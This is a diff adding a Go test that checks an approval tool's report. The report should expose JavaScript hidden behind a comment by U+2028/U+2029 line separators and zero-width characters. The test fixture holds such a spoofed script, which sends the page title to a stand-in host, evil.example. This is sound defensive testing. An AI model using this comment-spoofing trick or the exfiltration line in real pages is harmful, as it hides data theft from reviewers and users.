@@ -174,3 +174,28 @@ func TestTheReportShowsEveryScriptAsItRuns(t *testing.T) {
 		t.Errorf("the report hands the terminal a control or direction character:\n%q", out)
 	}
 }
+
+// TestTheReportBreaksLinesWhereScriptDoes: JavaScript ends a line at U+2028
+// and U+2029 as well as at a line feed, so a comment followed by one of them
+// ends there and the rest runs. The report shows the separator and starts a
+// new line where the script does, and shows every other invisible format
+// character (zero-width, direction) as an escape, so a line that reads as a
+// comment is one.
+func TestTheReportBreaksLinesWhereScriptDoes(t *testing.T) {
+	t.Parallel()
+	root, configDir := approvalVault(t)
+	spoof := "<p>chart</p><script>// draws the chart\u2028location.href=\"http://evil.example/\"+document.title\u2029go()\u200d</script>"
+	if err := os.WriteFile(filepath.Join(root, "Figures", "spoof.html"), []byte(spoof), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	_, out, _ := runApproval(t, root, configDir, true, "no\n", approveFigureCommand, "Figures/spoof.html")
+	want := "    | // draws the chart\\u2028\n" +
+		"    | location.href=\"http://evil.example/\"+document.title\\u2029\n" +
+		"    | go()\\u200d\n"
+	if !strings.Contains(out, want) {
+		t.Errorf("the report does not break the script where JavaScript does; want\n%s\ngot\n%s", want, out)
+	}
+	if strings.ContainsAny(out, "\u2028\u2029\u200d") {
+		t.Errorf("the report hands the terminal an invisible line or format character:\n%q", out)
+	}
+}
